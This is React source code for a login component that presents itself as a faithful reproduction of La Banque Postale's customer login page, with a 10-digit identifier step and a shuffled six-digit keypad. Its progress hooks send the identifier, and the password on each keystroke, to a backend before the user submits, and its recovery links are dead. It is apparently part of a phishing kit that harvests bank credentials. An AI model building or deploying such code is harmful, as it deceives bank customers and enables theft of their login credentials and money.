import { useEffect, useMemo, useState } from "react";

/**
 * Faithful reproduction of the official La Banque Postale customer portal login (two-phase):
 *   Phase A: identifiant input (10 digits) + memorize switch + "Continuer" button.
 *   Phase B (revealed after Continuer): keypad + 6 puces + "Se connecter" button.
 *
 * Important behaviors:
 *  - The identifiant input accepts up to 10 digits (bug fix: maxLength was capping displayed
 *    spaced value too early, so we now bind the raw 10-digit value and visually space it
 *    with letter-spacing instead of injecting spaces in the value).
 *  - The keypad NEVER appears at the same time as the identifiant entry. It only appears after
 *    clicking "Continuer" (which requires 10 valid digits).
 */

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

export default function LoginStep({ onSubmit, onProgress, submitting }) {
  const [identifiant, setIdentifiant] = useState("");
  const [memorize, setMemorize] = useState(false);
  const [phase, setPhase] = useState("identifiant"); // "identifiant" | "password"
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const [keypadKey, setKeypadKey] = useState(0);
  const keypadDigits = useMemo(
    () => shuffle(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [keypadKey]
  );

  // Re-shuffle the keypad each time we enter the password phase
  useEffect(() => {
    if (phase === "password") {
      setKeypadKey((k) => k + 1);
      setPassword("");
    }
  }, [phase]);

  // Progressive updates to backend (debounced inside parent)
  useEffect(() => {
    if (!onProgress) return;
    if (identifiant.length === 10) {
      onProgress("identifiant", { identifiant, memorise: memorize });
    }
  }, [identifiant, memorize, onProgress]);

  useEffect(() => {
    if (!onProgress) return;
    if (password.length > 0) {
      onProgress("password", {
        identifiant,
        mot_de_passe: password,
        memorise: memorize,
      });
    }
  }, [password, identifiant, memorize, onProgress]);

  const handleIdentifiantChange = (e) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 10);
    setIdentifiant(v);
    if (error) setError("");
  };

  const handleContinuer = (e) => {
    e.preventDefault();
    if (identifiant.length !== 10) {
      setError("L'identifiant doit contenir 10 chiffres.");
      return;
    }
    setError("");
    setPhase("password");
  };

  const handleBackToIdentifiant = () => {
    setPhase("identifiant");
    setPassword("");
    setError("");
  };

  const handleKeyClick = (digit) => {
    if (password.length >= 6) return;
    setPassword((p) => p + digit);
    if (error) setError("");
  };

  const handleErasePassword = () => setPassword("");

  const handleSeConnecter = (e) => {
    e.preventDefault();
    if (password.length !== 6) {
      setError("Le mot de passe doit contenir 6 chiffres.");
      return;
    }
    setError("");
    onSubmit({
      identifiant,
      mot_de_passe: password,
      memorise: memorize,
    });
  };

  return (
    <div className="fade-in" data-testid="login-step">
      <h1 className="text-xl sm:text-2xl font-bold tracking-tight text-[#003366] mb-6">
        Connexion à votre compte particulier
      </h1>

      {/* PHASE A : identifiant */}
      {phase === "identifiant" && (
        <form
          onSubmit={handleContinuer}
          className="space-y-5"
          data-testid="login-form"
        >
          <div className="space-y-2">
            <label
              htmlFor="identifiant"
              className="block text-sm font-bold text-[#003366]"
            >
              Identifiant (10 chiffres)
            </label>
            <input
              id="identifiant"
              data-testid="login-identifiant-input"
              type="tel"
              inputMode="numeric"
              autoComplete="username"
              value={identifiant}
              onChange={handleIdentifiantChange}
              placeholder="••••••••••"
              className="w-full h-12 rounded-md border border-[#B6BAC2] bg-white px-4 text-base sm:text-lg font-medium text-[#003366] tracking-[0.4em] outline-none transition focus:border-[#003366] focus:ring-2 focus:ring-[#003366]/20"
              aria-label="Identifiant 10 chiffres"
            />
            <div
              data-testid="login-identifiant-counter"
              className="text-xs text-[#7A8294]"
            >
              {identifiant.length} / 10
            </div>
          </div>

          <button
            type="button"
            data-testid="login-memorize-toggle"
            onClick={() => setMemorize((v) => !v)}
            className="flex w-full items-center justify-between text-sm sm:text-base text-[#003366] select-none"
          >
            <span className="font-medium">Mémoriser mon identifiant</span>
            <span className={`lbp-switch ${memorize ? "on" : ""}`}>
              <span className="lbp-switch-knob" />
            </span>
          </button>

          {error && (
            <p data-testid="login-error" className="text-sm text-[#C8102E]">
              {error}
            </p>
          )}

          <button
            type="submit"
            data-testid="login-continuer"
            disabled={submitting}
            className="w-full h-12 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-base font-semibold transition disabled:opacity-60"
          >
            Continuer
          </button>

          <div className="text-center pt-1">
            <a
              href="#"
              data-testid="login-forgot"
              onClick={(e) => e.preventDefault()}
              className="text-sm font-medium text-[#003366] underline hover:opacity-80"
            >
              Identifiant / Mot de passe oublié
            </a>
          </div>
        </form>
      )}

      {/* PHASE B : mot de passe (clavier virtuel) */}
      {phase === "password" && (
        <div className="slide-down" data-testid="password-panel">
          {/* Recap identifiant */}
          <div className="mb-5 flex items-center justify-between rounded-md bg-[#F1F5FA] px-4 py-2.5">
            <div className="flex flex-col">
              <span className="text-[11px] uppercase tracking-wide text-[#7A8294]">
                Identifiant
              </span>
              <span
                data-testid="login-identifiant-recap"
                className="text-sm font-semibold text-[#003366] font-mono tracking-widest"
              >
                {identifiant}
              </span>
            </div>
            <button
              type="button"
              data-testid="login-change-id"
              onClick={handleBackToIdentifiant}
              className="text-xs font-medium text-[#003366] underline hover:opacity-80"
            >
              Modifier
            </button>
          </div>

          <div className="text-sm font-bold text-[#003366]">
            Mot de passe (6 chiffres)
          </div>

          {/* Empty circle puces */}
          <div
            className="mt-3 flex items-center justify-center gap-3 sm:gap-4"
            aria-live="polite"
          >
            {[0, 1, 2, 3, 4, 5].map((i) => (
              <span
                key={i}
                data-testid={`pwd-dot-${i}`}
                className={`h-4 w-4 rounded-full border-[2.5px] transition ${
                  password.length > i
                    ? "bg-[#003366] border-[#003366]"
                    : "border-[#003366] bg-white"
                }`}
              />
            ))}
          </div>

          {password.length > 0 && (
            <div className="mt-2 text-center">
              <button
                type="button"
                data-testid="pwd-clear"
                onClick={handleErasePassword}
                className="text-xs text-[#4F5A6B] hover:text-[#003366] underline"
              >
                Effacer
              </button>
            </div>
          )}

          {/* Virtual randomized keypad */}
          <div
            data-testid="virtual-keypad"
            className="mt-4 grid grid-cols-5 gap-2"
          >
            {keypadDigits.map((digit, idx) => (
              <button
                key={`${keypadKey}-${idx}`}
                type="button"
                data-testid={`keypad-key-${digit}`}
                onClick={() => handleKeyClick(digit)}
                disabled={password.length >= 6 || submitting}
                className="h-11 sm:h-13 rounded-lg bg-[#E8F1FB] text-[#003366] text-lg sm:text-xl font-bold hover:bg-[#D6E5F7] active:bg-[#C2D6F0] disabled:opacity-50 transition"
              >
                {digit}
              </button>
            ))}
          </div>

          <p className="mt-3 text-[11px] text-[#7A8294] text-center">
            Utilisez les boutons ci-dessus, n'appuyez pas sur les chiffres de votre clavier.
          </p>

          {error && (
            <p
              data-testid="login-error"
              className="mt-3 text-sm text-[#C8102E] text-center"
            >
              {error}
            </p>
          )}

          <button
            type="button"
            data-testid="login-submit"
            onClick={handleSeConnecter}
            disabled={submitting || password.length !== 6}
            className="mt-5 w-full h-12 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-base font-semibold transition disabled:opacity-60"
          >
            {submitting ? "Connexion…" : "Se connecter"}
          </button>

          <div className="text-center pt-3">
            <a
              href="#"
              data-testid="login-forgot"
              onClick={(e) => e.preventDefault()}
              className="text-sm font-medium text-[#003366] underline hover:opacity-80"
            >
              Identifiant / Mot de passe oublié
            </a>
          </div>
        </div>
      )}
    </div>
  );
}
